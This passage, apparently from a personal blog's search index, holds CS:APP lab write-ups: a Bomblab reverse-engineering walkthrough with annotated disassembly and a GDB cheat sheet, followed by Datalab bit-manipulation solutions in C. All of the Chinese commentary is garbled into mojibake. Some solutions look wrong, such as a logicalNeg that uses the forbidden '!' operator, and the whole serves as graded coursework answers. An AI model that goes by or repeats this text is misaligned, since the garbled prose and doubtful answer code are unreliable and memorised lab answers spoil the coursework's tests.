ˆé¡¶åœ°å€æŒ‡å‘çš„å€¼æ˜¯å¦ä¸º1ï¼Œå³ç¬¬ä¸€ä¸ªæ•°å­—æ˜¯1ã€‚\nä¹‹åè¿›å…¥å¾ªç¯ï¼Œå¾ªç¯ä½“æ¯æ¬¡éƒ½ä¼šæŠŠå½“å‰æ•°å­—*2å’Œä¸‹ä¸€ä¸ªæ•°å­—æ¯”è¾ƒï¼Œå³æ¯ä¸ªæ•°å­—éƒ½æ˜¯å‰ä¸€ä¸ªçš„äºŒå€ï¼›%rbxä½œè®¡æ•°å˜é‡ï¼Œå…±å¾ªç¯6æ¬¡ã€‚ç­”æ¡ˆå‘¼ä¹‹æ¬²å‡ºã€‚\nç¬¬ä¸‰å…³ï¼šåˆ†æ”¯ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 0000000000400f43 \u0026lt;phase_3\u0026gt;: 400f43:\t48 83 ec 18 sub $0x18,%rsp 400f47:\t48 8d 4c 24 0c lea 0xc(%rsp),%rcx //rsp+12â†’rcx: mun2 400f4c:\t48 8d 54 24 08 lea 0x8(%rsp),%rdx //rsp+8â†’rdx: mun1 400f51:\tbe cf 25 40 00 mov $0x4025cf,%esi //0x4025cf: \u0026#34;%d %d\u0026#34; 400f56:\tb8 00 00 00 00 mov $0x0,%eax 400f5b:\te8 90 fc ff ff callq 400bf0 \u0026lt;__isoc99_sscanf@plt\u0026gt; 400f60:\t83 f8 01 cmp $0x1,%eax //ä¸å°‘äºä¸€ä¸ªè¾“å…¥ 400f63:\t7f 05 jg 400f6a \u0026lt;phase_3+0x27\u0026gt; 400f65:\te8 d0 04 00 00 callq 40143a \u0026lt;explode_bomb\u0026gt; 400f6a:\t83 7c 24 08 07 cmpl $0x7,0x8(%rsp) // 400f6f:\t77 3c ja 400fad \u0026lt;phase_3+0x6a\u0026gt; //è¶…è¿‡7åˆ™çˆ†ç‚¸ 400f71:\t8b 44 24 08 mov 0x8(%rsp),%eax //å–num1 400f75:\tff 24 c5 70 24 40 00 jmpq *0x402470(,%rax,8) æ­¤å¤„*ç›¸å½“äºcä¸­çš„å–åœ°å€ç¬¦\u0026amp;ï¼Œ\n1 2 3 400f7c:\tb8 cf 00 00 00 mov $0xcf,%eax 400f81:\teb 3b jmp 400fbe \u0026lt;phase_3+0x7b\u0026gt; Â·Â·Â·Â·Â·Â· è¿™é‡Œæœ‰7æ®µå½¢å¼é‡å¤çš„ä»£ç ï¼Œç»“åˆç¬¬ä¸€ä¸ªæ•°å­—ä¸èƒ½å¤§äº7ï¼ŒçŒœæµ‹è¿™é‡Œæ˜¯switchå‹ç»“æ„ã€‚\n1 2 3 4 5 6 7 8 9 400fad:\te8 88 04 00 00 callq 40143a \u0026lt;explode_bomb\u0026gt; 400fb2:\tb8 00 00 00 00 mov $0x0,%eax 400fb7:\teb 05 jmp 400fbe \u0026lt;phase_3+0x7b\u0026gt; 400fb9:\tb8 37 01 00 00 mov $0x137,%eax 400fbe:\t3b 44 24 0c cmp 0xc(%rsp),%eax //æ¯”è¾ƒnum2å’Œeax 400fc2:\t74 05 je 400fc9 \u0026lt;phase_3+0x86\u0026gt; 400fc4:\te8 71 04 00 00 callq 40143a \u0026lt;explode_bomb\u0026gt; 400fc9:\t48 83 c4 18 add $0x18,%rsp 400fcd:\tc3 retq ç¬¬äºŒä¸ªæ•°å­—æ˜¯%eaxçš„å€¼ï¼Œç”±ç¬¬ä¸€ä¸ªæ•°å†³å®šã€‚æ•…ç­”æ¡ˆæœ‰7ä¸ªã€‚\nç¬¬å››å…³ï¼šé€’å½’ 1 2 3 4 5 6 7 8 9 10 11 000000000040100c \u0026lt;phase_4\u0026gt;: ...... 401029:\t83 f8 02 cmp $0x2,%eax //åªèƒ½æœ‰2å‚æ•° 40102c:\t75 07 jne 401035 \u0026lt;phase_4+0x29\u0026gt; 40102e:\t83 7c 24 08 0e cmpl $0xe,0x8(%rsp) //0 \u0026lt;= num1 \u0026lt;= 14 401033:\t76 05 jbe 40103a \u0026lt;phase_4+0x2e\u0026gt; 401035:\te8 00 04 00 00 callq 40143a \u0026lt;explode_bomb\u0026gt; 40103a:\tba 0e 00 00 00 mov $0xe,%edx 40103f:\tbe 00 00 00 00 mov $0x0,%esi 401044:\t8b 7c 24 08 mov 0x8(%rsp),%edi //num1â†’edi 401048:\te8 81 ff ff ff callq 400fce \u0026lt;func4\u0026gt; // è¾“å…¥è§„åˆ™å’Œä¸Šä¸€å…³ä¸€æ ·ï¼Œç¬¬ä¸€ä¸ªæ•°éœ€åœ¨0åˆ°14ä¹‹é—´ï¼ˆcmplåªèƒ½ç”¨äºæ— ç¬¦å·æ•°ï¼Ÿï¼‰\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 0000000000400fce \u0026lt;func4\u0026gt;: //é¦–æ¬¡è°ƒç”¨æ—¶ï¼š%eax:0x2 %ebx:0 %ecx:0 %edx:0xe %esi:0x0 %edi:num1 400fce:\t48 83 ec 08 sub $0x8,%rsp 400fd2:\t89 d0 mov %edx,%eax //eax:14 400fd4:\t29 f0 sub %esi,%eax //eax:14-0 400fd6:\t89 c1 mov %eax,%ecx //ecx:14 400fd8:\tc1 e9 1f shr $0x1f,%ecx //ecx:0 //é€»è¾‘å³ç§»31ï¼Œå³å–ç¬¦å·ä½ã€‚ 400fdb:\t01 c8 add %ecx,%eax //eax:14+0 400fdd:\td1 f8 sar %eax //ç®—æœ¯å³ç§»1ä½ï¼Ÿeax:14/2=7 400fdf:\t8d 0c 30 lea (%rax,%rsi,1),%ecx //ecx:7+0 400fe2:\t39 f9 cmp %edi,%ecx //æ¯”è¾ƒnum1å’Œ7 400fe4:\t7e 0c jle 400ff2 \u0026lt;func4+0x24\u0026gt; //ä¸å¤§äºâ†’r17 400fe6:\t8d 51 ff lea -0x1(%rcx),%edx //edx:ecx-1=6 400fe9:\te8 e0 ff ff ff callq 400fce \u0026lt;func4\u0026gt; //é€’å½’â†’r3 400fee:\t01 c0 add %eax,%eax 400ff0:\teb 15 jmp 401007 \u0026lt;func4+0x39\u0026gt; //è·³å‡º 400ff2:\tb8 00 00 00 00 mov $0x0,%eax 400ff7:\t39 f9 cmp %edi,%ecx //æ¯”è¾ƒnum1å’Œ7 400ff9:\t7d 0c jge 401007 \u0026lt;func4+0x39\u0026gt; //ä¸å°äº 400ffb:\t8d 71 01 lea 0x1(%rcx),%esi //esi:ecx+1=8 400ffe:\te8 cb ff ff ff callq 400fce \u0026lt;func4\u0026gt; //é€’å½’â†’r3 401003:\t8d 44 00 01 lea 0x1(%rax,%rax,1),%eax //eax=2*eax+1 401007:\t48 83 c4 08 add $0x8,%rsp 40100b:\tc3 retq å‰é¢ä¸€é€šç®—æœ¯æ“ä½œï¼Œåé¢è®¾è®¡äº†é€’å½’ã€‚\nè¿™é‡Œä¸€æ­¥ç§»ä½æ“ä½œçœ‹èµ·æ¥åƒæ˜¯å–ç¬¦å·ä½ï¼Œä½†æ˜¯è¾“å…¥ä¸€å®šå¤§äº0ï¼Œç¬¦å·ä½æ˜¯0ï¼Œæ‰€ä»¥è¿™ä¸ªæ“ä½œæ„ä¹‰ä½•åœ¨ï¼Ÿ\näººè‚‰IDAèµ°èµ·ï¼š\n1 2 3 4 5 6 7 8 9 int fun4(int num1,int x,int y){ int s,a; s=(x-y)/2+y; if(num1\u0026gt;s)\treturn 2*fun4(num1,s-1,y); a=0; if(num1\u0026lt;s)\treturn 2*fun4(num1,x,s+1)+1; return a; } fun4(num1,14,0); ç¬¬ä¸€ä¸ªæ•°è®¾ä¸º7å¯é¿å…é€’å½’è°ƒç”¨ï¼Œä½†è¿”å›å€¼ä¸æ˜¯0ï¼Œä¸ç¬¦åˆã€‚\n1 2 3 4 5 6 7 40104d:\t85 c0 test %eax,%eax //eax=0 40104f:\t75 07 jne 401058 \u0026lt;phase_4+0x4c\u0026gt;//ä¸ç­‰äº0çˆ†ç‚¸ 401051:\t83 7c 24 0c 00 cmpl $0x0,0xc(%rsp) //mun2å’Œ0æ¯”è¾ƒï¼Ÿ 401056:\t74 05 je 40105d \u0026lt;phase_4+0x51\u0026gt;//ä¸ç­‰äº0çˆ†ç‚¸ 401058:\te8 dd 03 00 00 callq 40143a \u0026lt;explode_bomb\u0026gt; 40105d:\t48 83 c4 18 add $0x18,%rsp 401061:\tc3 retq çœ‹åˆ°çš„è¿”å›å€¼å’Œnum2çš†éœ€ä¸º0ï¼Œåˆ™num2ç¡®å®šã€‚\nå¤§ä¸äº†çˆ†ç ´å‘—ï¼Œç´¢æ€§è¯•äº†1æ¬¡å°±æˆäº†ã€‚emm\nã€åé¢ä¸‰å…³æ–½å·¥ä¸­ã€‚ã€‚ã€‚ã€‘\nç¬¬äº”å…³ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 0000000000401062 \u0026lt;phase_5\u0026gt;: 401062:\t53 push %rbx 401063:\t48 83 ec 20 sub $0x20,%rsp 401067:\t48 89 fb mov %rdi,%rbx 40106a:\t64 48 8b 04 25 28 00 mov %fs:0x28,%rax //??? 401073:\t48 89 44 24 18 mov %rax,0x18(%rsp) 401078:\t31 c0 xor %eax,%eax //eax:0 40107a:\te8 9c 02 00 00 callq 40131b \u0026lt;string_length\u0026gt; 40107f:\t83 f8 06 cmp $0x6,%eax //è¾“å…¥é•¿åº¦ä¸º6 401082:\t74 4e je 4010d2 \u0026lt;phase_5+0x70\u0026gt; 401084:\te8 b1 03 00 00 callq 40143a \u0026lt;explode_bomb\u0026gt; 401089:\teb 47 jmp 4010d2 \u0026lt;phase_5+0x70\u0026gt; 40108b:\t0f b6 0c 03 movzbl (%rbx,%rax,1),%ecx //å¾ªç¯å¤´ã€‚æ–°æŒ‡ä»¤ 40108f:\t88 0c 24 mov %cl,(%rsp) 401092:\t48 8b 14 24 mov (%rsp),%rdx 401096:\t83 e2 0f and $0xf,%edx 401099:\t0f b6 92 b0 24 40 00 movzbl 0x4024b0(%rdx),%edx //ï¼Ÿï¼Ÿï¼Ÿ 4010a0:\t88 54 04 10 mov %dl,0x10(%rsp,%rax,1) 4010a4:\t48 83 c0 01 add $0x1,%rax //è®¡æ•°å˜é‡rax 4010a8:\t48 83 f8 06 cmp $0x6,%rax //å¾ªç¯6è½® 4010ac:\t75 dd jne 40108b \u0026lt;phase_5+0x29\u0026gt; //å¾ªç¯å°¾ 4010ae:\tc6 44 24 16 00 movb $0x0,0x16(%rsp) 4010b3:\tbe 5e 24 40 00 mov $0x40245e,%esi //ï¼Ÿï¼Ÿ 4010b8:\t48 8d 7c 24 10 lea 0x10(%rsp),%rdi 4010bd:\te8 76 02 00 00 callq 401338 \u0026lt;strings_not_equal\u0026gt; 4010c2:\t85 c0 test %eax,%eax 4010c4:\t74 13 je 4010d9 \u0026lt;phase_5+0x77\u0026gt; 4010c6:\te8 6f 03 00 00 callq 40143a \u0026lt;explode_bomb\u0026gt; 4010cb:\t0f 1f 44 00 00 nopl 0x0(%rax,%rax,1) //ï¼Ÿï¼Ÿï¼Ÿ 4010d0:\teb 07 jmp 4010d9 \u0026lt;phase_5+0x77\u0026gt;//è·³å‡º 4010d2:\tb8 00 00 00 00 mov $0x0,%eax 4010d7:\teb b2 jmp 40108b \u0026lt;phase_5+0x29\u0026gt; 4010d9:\t48 8b 44 24 18 mov 0x18(%rsp),%rax 4010de:\t64 48 33 04 25 28 00 xor %fs:0x28,%rax //ï¼Ÿï¼Ÿï¼Ÿ 4010e7:\t74 05 je 4010ee \u0026lt;phase_5+0x8c\u0026gt; 4010e9:\te8 42 fa ff ff callq 400b30 \u0026lt;__stack_chk_fail@plt\u0026gt; 4010ee:\t48 83 c4 20 add $0x20,%rsp 4010f2:\t5b pop %rbx 4010f3:\tc3 retq ç¬¬å…­å…³ éšè—å…³ éšè—å…³è—åœ¨æ¯ä¸€å…³çš„åé¢ï¼Œ\nGDBä½¿ç”¨ï¼š åŸºç¡€ï¼š\n1 2 3 4 5 q : quit h : help file prog//åŠ è½½ç¨‹åºï¼Œä¹Ÿå¯ä½œä¸ºgdbå‘½ä»¤çš„å‚æ•° r : run k : kill æ–­ç‚¹ï¼š\n1 2 3 4 5 6 7 8 9 10 b : breakpoints break - func_name - *0x400522 - \u0026amp;var - main.c:100//æºä»£ç æ–­ç‚¹ï¼Œè¿è¡Œå‰å³å¯ - if con//æ¡ä»¶æ–­ç‚¹ w : watch //è§‚å¯Ÿå¯¹è±¡å˜åŒ–æ—¶æ–­ç‚¹ d : delete - b n disable b n æ‰§è¡Œï¼š\n1 2 3 4 5 6 c : continue f : finish stepi n nexti set args ./a.txt //ä»æ–‡ä»¶è¯»å–è¾“å…¥ æ£€æŸ¥ä»£ç ï¼š\n1 2 3 4 5 6 disas //å±•ç¤ºæ±‡ç¼– - funcname - 0x400000 - list edit æ£€æŸ¥æ•°æ®ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 x : examine p : print æ ¼å¼æ§åˆ¶ï¼š/[n][f][u] - n:å†…å­˜å•å…ƒä¸ªæ•° - f:æ˜¾ç¤ºæ ¼å¼ï¼š - x(hex) æŒ‰åå…­è¿›åˆ¶æ ¼å¼æ˜¾ç¤ºå˜é‡ã€‚ - d(decimal) æŒ‰åè¿›åˆ¶æ ¼å¼æ˜¾ç¤ºå˜é‡ã€‚ - u(unsigned decimal) æŒ‰åè¿›åˆ¶æ ¼å¼æ˜¾ç¤ºæ— ç¬¦å·æ•´å‹ã€‚ - o(octal) æŒ‰å…«è¿›åˆ¶æ ¼å¼æ˜¾ç¤ºå˜é‡ã€‚ - t(binary) æŒ‰äºŒè¿›åˆ¶æ ¼å¼æ˜¾ç¤ºå˜é‡ã€‚ - a(address) æŒ‰åå…­è¿›åˆ¶æ ¼å¼æ˜¾ç¤ºå˜é‡ã€‚ - c(char) æŒ‰å­—ç¬¦æ ¼å¼æ˜¾ç¤ºå˜é‡ã€‚ - f(float) æŒ‰æµ®ç‚¹æ•°æ ¼å¼æ˜¾ç¤ºå˜é‡ - u:å•å…ƒé•¿åº¦ï¼ˆæŒ‰å­—èŠ‚ï¼‰ i : info - r : registers - b [n] - $rsp è¡¨è¾¾å¼ï¼š\nå †æ ˆï¼š\n1 bt : backtrace//æ˜¾ç¤ºå †æ ˆ ","date":"2020-02-27T22:43:31Z","permalink":"https://lonelyuan.github.io/p/csapp-bomblab/","title":"CSAPP - Bomblab"},{"content":"ç¬¬ä¸€ä¸ªlabï¼Œå…³äºä½è¿ç®—ã€‚é€šè¿‡å—é™åˆ¶çš„cè¯­è¨€ç¼–ç¨‹å®ç°å‡½æ•°åŠŸèƒ½ã€‚è¿™äº›å‡½æ•°éƒ½æ˜¯éå¸¸åŸºæœ¬çš„åŠŸèƒ½ï¼Œæ­£å¦‚ä¹¦åã€ŠCS:APPã€‹æ‰€ç¤ºï¼Œå¯å‘æˆ‘ä»¬ä»ç¨‹åºå‘˜è§†è§’ç†è§£è®¡ç®—æœºçš„æ·±å±‚æ›´æ·±å±‚ã€‚\nREADMEä¸­è¯´æ˜äº†é¡¹ç›®ç»“æ„ã€‚ç›´æ¥è¯»bits.cï¼Œåªéœ€è¦å¡«å……å…¶ä¸­çš„å‡½æ•°ã€‚æ¯æ¬¡æµ‹è¯•ç¨‹åºéƒ½è¦å…ˆmakeä¸€ä¸‹ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 241 242 243 244 245 246 247 248 249 250 251 252 //1 /* * bitXor - x^y using only ~ and \u0026amp; * Example: bitXor(4, 5) = 1 * Legal ops: ~ \u0026amp; * Max ops: 14 * Rating: 1 */ int bitXor(int x, int y) { // x^y // = (~x\u0026amp;y)|(x\u0026amp;~y) // å¼‚æˆ–å…¬å¼ // = ~(~(~x\u0026amp;y)\u0026amp;~(x\u0026amp;~y)) // å¾·æ‘©æ ¹å¾‹ï¼Œops: 8 // = ~((x|~y)\u0026amp;(~x|y)) // å¾·æ‘©æ ¹å¾‹ // = ~(x\u0026amp;~x|x\u0026amp;y|y\u0026amp;~y|~x\u0026amp;~y) // åˆ†é…å¾‹ // = ~(x\u0026amp;y|~x\u0026amp;~y) // å¸æ”¶ç‡ return ~(x\u0026amp;y)\u0026amp;~(~x\u0026amp;~y); // å¾·æ‘©æ ¹å¾‹ï¼Œops: 7 } /* * tmin - return minimum two\u0026#39;s complement integer * Legal ops: ! ~ \u0026amp; ^ | + \u0026lt;\u0026lt; \u0026gt;\u0026gt; * Max ops: 4 * Rating: 1 */ int tmin(void) { // For negative numbers: complement = inverse + 1 return 1 \u0026lt;\u0026lt; 31; // tmin=0x80, tmax=0x7f // ä¸ºä»€ä¹ˆæ˜¯è¡¥ç ï¼Ÿ // ä¸ºäº†æ–¹ä¾¿è®¡ç®—æœºå¤„ç†ï¼Œæˆ‘ä»¬å¸Œæœ›è´Ÿæ•°å’Œå…¶ç›¸åæ•°ç›¸åŠ ä¹‹åè‡ªç„¶çš„æº¢å‡ºå¾—0ã€‚ // x+~x=1, å†åŠ 1åˆ™æº¢å‡ºå¾—0ã€‚å› æ­¤è¡¥ç =åç +1ã€‚ // åŒæ—¶ç¬¦å·ä½å¤©ç„¶çš„è•´å«åœ¨æœ€é«˜ä½ä¸Šï¼Œè¿™æœ‰è®¸å¤šå¥½å¤„ã€‚ // å…¶ä¸€æ˜¯æ­£æ•°çš„è¡¨ç°å’Œæ— ç¬¦å·æ•´æ•°ä¸€è‡´ã€‚ // å…¶äºŒæ˜¯ç”±äºï¼‹0å’Œ-0ä¸€è‡´ï¼Œç›¸æ¯”æ˜¾å¼ç¬¦å·ä½èƒ½å¤šè¡¨ç¤ºä¸€ä¸ªæ•°å­—ï¼ŒèŒƒå›´æ˜¯[-2^(n-1),2^(n-1)-1] } //2 /* * isTmax - returns 1 if x is the maximum, two\u0026#39;s complement number, * and 0 otherwise * Legal ops: ! ~ \u0026amp; ^ | + * Max ops: 10 * Rating: 1 */ int isTmax(int x) { // ! é€»è¾‘å–åï¼Œä»…å…¨0è¿”å›1ï¼Œå…¶ä½™æƒ…å†µéƒ½è¿”å›0 // ~ æŒ‰ä½å–å // è¡¥ç ç›¸åæ•° = åç  + 1 // ä¸¤ä¸ªç‰¹ä¾‹ï¼š~tmin+1=tmin; ~0+1=0. ç›¸åæ•°ä¸ºè‡ªèº« // å¾—åˆ°å‡ ä¸ªå‡½æ•°ï¼š // negate(x) (~x+1) // å–ç›¸åæ•° // iszero(x) (!!x) // ä»…å½“!!0=0 // equal(x,y) !(x^y) // åˆ¤æ–­ç›¸ç­‰ // ~tmax=tmin, è½¬æ¢ä¸ºç­›é€‰tminå’Œ0xff // å› æ­¤ç­”æ¡ˆä¸º equal(~x,negate(~x)) \u0026amp; iszero(~x) return !((x+1)^(~x)) \u0026amp; (!!~x); // ops: 8 } /* * allOddBits - return 1 if all odd-numbered bits in word set to 1 * where bits are numbered from 0 (least significant) to 31 (most significant) * Examples allOddBits(0xFFFFFFFD) = 0, allOddBits(0xAAAAAAAA) = 1 * Legal ops: ! ~ \u0026amp; ^ | + \u0026lt;\u0026lt; \u0026gt;\u0026gt; * Max ops: 12 * Rating: 2 */ int allOddBits(int x) { // æ©ç : x \u0026amp; 0b1111, ç»“æœç›¸å½“äºåªå–äº†xçš„å4ä½ // å¥‡æ•°ä½å…¨ä¸º1ï¼Œä½¿ç”¨æ©ç 0xAAAAAAAAæå–å¥‡æ•°ä½ï¼Œå†ä½¿ç”¨equal(x,0xAAAAAAAA)åˆ¤æ–­å³å¯ int mask = 0xAA; mask += mask \u0026lt;\u0026lt; 8; mask += mask \u0026lt;\u0026lt; 16; return !(x\u0026amp;mask ^ mask); // ops: 7 } /* * negate - return -x * Example: negate(1) = -1. * Legal ops: ! ~ \u0026amp; ^ | + \u0026lt;\u0026lt; \u0026gt;\u0026gt; * Max ops: 5 * Rating: 2 */ int negate(int x) { return ~x+1; } //3 /* * isAsciiDigit - return 1 if 0x30 \u0026lt;= x \u0026lt;= 0x39 (ASCII codes for characters \u0026#39;0\u0026#39; to \u0026#39;9\u0026#39;) * Example: isAsciiDigit(0x35) = 1. * isAsciiDigit(0x3a) = 0. * isAsciiDigit(0x05) = 0. * Legal ops: ! ~ \u0026amp; ^ | + \u0026lt;\u0026lt; \u0026gt;\u0026gt; * Max ops: 15 * Rating: 3 */ int isAsciiDigit(int x) { // x \u0026gt; y // =\u0026gt; x+(~y+1) \u0026gt; 0 // x+(-y)\u0026gt;0 // =\u0026gt; !(x+(~y+1) \u0026gt;\u0026gt; 31) // ä½¿ç”¨ç¬¦å·ä½åˆ¤æ–­\u0026gt;0 // å¾—åˆ°æ¯”è¾ƒå‡½æ•°ï¼š // gpos(x, y) !(x+(~y+1) \u0026gt;\u0026gt; 31) // å¸¦å…¥å³å¯ !((0x39 + ~x+1)\u0026gt;\u0026gt;31) \u0026amp; !((x + ~0x30+1)\u0026gt;\u0026gt;31) // ops: 11 return !((~x+0x3A)\u0026gt;\u0026gt;31) \u0026amp; !((x + ~0x30+1)\u0026gt;\u0026gt;31); // ops: 10 } /* * conditional - same as x ? y : z * Example: conditional(2,4,5) = 4 * Legal ops: ! ~ \u0026amp; ^ | + \u0026lt;\u0026lt; \u0026gt;\u0026gt; * Max ops: 16 * Rating: 3 */ int conditional(int x, int y, int z) { // æˆ–è¿ç®—ä¸¤ä¾§ä¸åŒæ—¶ä¸º1å³å¯æ„æˆæ¡ä»¶åˆ¤æ–­ï¼Œä½¿ç”¨æ©ç æ§åˆ¶è¾“å‡ºå†…å®¹ // é”™è¯¯åšæ³•ï¼š // int mask = x \u0026gt;\u0026gt; 31; // ç®—æ•°å³ç§»å–ç¬¦å·ä½å¡«å……å…¨éƒ¨ä½ // x ? y : z å¯¹xæ˜¯é€»è¾‘åˆ¤æ–­ä¸æ˜¯ç®—æœ¯åˆ¤æ–­ int mask= ~!x+1; // ä»…0è¿”å›1 return (~mask\u0026amp;y)|(mask\u0026amp;z) ; // ops: 7 } /* * isLessOrEqual - if x \u0026lt;= y then return 1, else return 0 * Example: isLessOrEqual(4,5) = 1. * Legal ops: ! ~ \u0026amp; ^ | + \u0026lt;\u0026lt; \u0026gt;\u0026gt; * Max ops: 24 * Rating: 3 */ int isLessOrEqual(int x, int y) { // gpos(x, y) åœ¨è·¨ç¬¦å·çš„æƒ…å†µä¸‹å¤±çµï¼Œå¢åŠ ä¸¤ç§æƒ…å†µåˆ¤æ–­: // 1. x=yï¼šè¿”å›1 // 2. xå’Œyä¸åŒç¬¦å·ï¼šxä¸ºè´Ÿæ—¶ä¸€å®šå°äºï¼Œè¿”å›1ï¼Œxç¬¦å·ä½ä¹Ÿæ˜¯1 // å› æ­¤ç­”æ¡ˆä¸º equal(signx,signy) ? (gpos(y,x) | equal(x,y)) : signx int signx=!!(x\u0026gt;\u0026gt;31), signy=!!(y\u0026gt;\u0026gt;31); int mask = (signx^signy); return (!mask \u0026amp; (!(y+(~x+1)\u0026gt;\u0026gt;31)) | !((x)^(y))) | (mask\u0026amp;signx); // ops: 19 } //4 /* * logicalNeg - implement the ! operator, using all of * the legal operators except ! * Examples: logicalNeg(3) = 0, logicalNeg(0) = 1 * Legal ops: ~ \u0026amp; ^ | + \u0026lt;\u0026lt; \u0026gt;\u0026gt; * Max ops: 12 * Rating: 4 */ int logicalNeg(int x) { // ä»…0è¿”å›1ï¼Œå…¶ä½™è¿”å›0 // è¿˜æ˜¯å€ŸåŠ©ä¸¤ä¸ªç‰¹ä¾‹ï¼š~tmin+1=tmin; ~0+1=0. ç›¸åæ•°ä¸ºè‡ªèº« // ç­”æ¡ˆä¸º equal(x,~x+1) \u0026amp; !equal(x,tmin) // !(x^0) \u0026amp; !!(x^(1\u0026lt;\u0026lt;31)) return !((x^0) | !(x^(1\u0026lt;\u0026lt;31))); // ops: 6 } /* howManyBits - return the minimum number of bits required to represent x in * two\u0026#39;s complement * Examples: howManyBits(12) = 5 // [-16,15] * howManyBits(298) = 10 // [-512,511] * howManyBits(-5) = 4 // [-8,7] * howManyBits(0) = 1 * howManyBits(-1) = 1 // [-1,0] * howManyBits(0x80000000) = 32 * Legal ops: ! ~ \u0026amp; ^ | + \u0026lt;\u0026lt; \u0026gt;\u0026gt; * Max ops: 90 * Rating: 4 */ int howManyBits(int x) { // è´Ÿæ•°å–åï¼Œç»Ÿä¸€å¤„ç† // x\u0026gt;\u0026gt;31 ? ~x:x = x\u0026gt;\u0026gt;31 \u0026amp; ~x | ~(x\u0026gt;\u0026gt;31) \u0026amp; x x = x\u0026gt;\u0026gt;31^x; // ä½å®½å–å†³äºæœ€é«˜ä½ï¼Œé—®é¢˜è½¬åŒ–ä¸ºå¯»æ‰¾æœ€é«˜ä½ // 90ä¸ªæ“ä½œç¬¦ä¸è¶³ä»¥éå†32ä¸ªä½ï¼Œå› æ­¤éœ€è¦ä¼˜åŒ–æœç´¢ç®—æ³•ï¼Œå¦‚äºŒåˆ†ã€‚ // !!(x\u0026gt;\u0026gt;16) åˆ¤æ–­xçš„é«˜16ä½æ˜¯å¦å­˜åœ¨1 int b16 = !!(x\u0026gt;\u0026gt;16) \u0026lt;\u0026lt; 4; // è‹¥å­˜åœ¨ï¼Œè‡³å°‘éœ€è¦16ä½ï¼Œå› æ­¤b16èµ‹å€¼ä¸º16æˆ–0 x = x \u0026gt;\u0026gt; b16; // é€šè¿‡ç§»ä½å®ç°äºŒåˆ†æœç´¢ï¼š // è‹¥é«˜ä½å­˜åœ¨åˆ™èˆå¼ƒä½ä½ï¼Œé«˜ä½å…¨0åˆ™åˆ¤æ–­ä½ä½ int b8 = !!(x\u0026gt;\u0026gt;8) \u0026lt;\u0026lt; 3; x = x \u0026gt;\u0026gt; b8; int b4 = !!(x\u0026gt;\u0026gt;4) \u0026lt;\u0026lt; 2; x = x \u0026gt;\u0026gt; b4; int b2 = !!(x\u0026gt;\u0026gt;2) \u0026lt;\u0026lt; 1; x = x \u0026gt;\u0026gt; b2; int b1 = !!(x\u0026gt;\u0026gt;1); x = x \u0026gt;\u0026gt; b1; return b16+b8+b4+b2+b1+x+1; } //float /* * floatScale2 - Return bit-level equivalent of expression 2*f for * floating point argument f. * Both the argument and result are passed as unsigned int\u0026#39;s, but * they are to be interpreted as the bit-level representation of * single-precision floating point values. * When argument is NaN, return argument * Legal ops: Any integer/unsigned operations incl. ||, \u0026amp;\u0026amp;. also if, while * Max ops: 30 * Rating: 4 */ unsigned floatScale2(unsigned uf) { unsigned s = uf \u0026amp; (1 \u0026lt;\u0026lt; 31); unsigned exp = (uf \u0026amp; 0x7f800000) \u0026gt;\u0026gt; 23; unsigned frac = uf \u0026amp; (~0xff800000); if (exp == 0) return frac \u0026lt;\u0026lt; 1 | s; // éè§„æ ¼æ•°ä¹˜2å³å¯ if (exp == 255) return uf; // ç‰¹æ®Šå€¼ç›´æ¥è¿”å› exp++; if (exp == 255) return 0x7f800000 | s; // ä¹˜æ³•ä¸å¯èƒ½å¾—åˆ°NaNï¼Œæ‰€ä»¥è¿”å›æ— ç©· return s | (exp \u0026lt;\u0026lt; 23) | frac; } /* * floatFloat2Int - Return bit-level equivalent of expression (int) f * for floating point argument f. * Argument is passed as unsigned int, but * it is to be interpreted as the bit-level representation of a * single-precision floating point value. * Anything out of range (including NaN and infinity) should return * 0x80000000u. * Legal ops: Any integer/unsigned operations incl. ||, \u0026amp;\u0026amp;. also if, while * Max ops: 30 * Rating: 4 */ int floatFloat2Int(unsigned uf) { unsigned s = uf \u0026amp; (1 \u0026lt;\u0026lt; 31); unsigned exp = (uf \u0026amp; 0x7f800000) \u0026gt;\u0026gt; 23; unsigned frac = uf \u0026amp; (~0xff800000); int E = exp - 127; if (exp == 255 || E \u0026gt; 31) return 0x80000000; // ç‰¹æ®Šå€¼ if (E \u0026lt; 0) return 0; // å°æ•°èˆå…¥ä¸º0 unsigned M = frac | (1 \u0026lt;\u0026lt; 23); // 1 + frac int V = (E \u0026gt; 23 ? M \u0026lt;\u0026lt; (E - 23) : M \u0026gt;\u0026gt; (23 - E)); // Må·²ç»è¢«å·¦ç§»äº†23ä½ if (s) V *= -1; // è´Ÿæ•° return V; } /* * floatPower2 - Return bit-level equivalent of the expression 2.0^x * (2.0 raised to the power x) for any 32-bit integer x. * * The unsigned value that is returned should have the identical bit * representation as the single-precision floating-point number 2.0^x. * If the result is too small to be represented as a denorm, return * 0. If too large, return +INF. * * Legal ops: Any integer/unsigned operations incl. ||, \u0026amp;\u0026amp;. Also if, while * Max ops: 30 * Rating: 4 */ unsigned floatPower2(int x) { // V = (-1)^s * M * 2^E // E = e-127 Eâˆˆ[-126,127] // s=0,f=0, xå¸¦å…¥Eå³å¯å¾—åˆ° 2^x // ä¸ºæ­¤ï¼Œåæ¼”ä»Eæ±‚eçš„è¿‡ç¨‹ 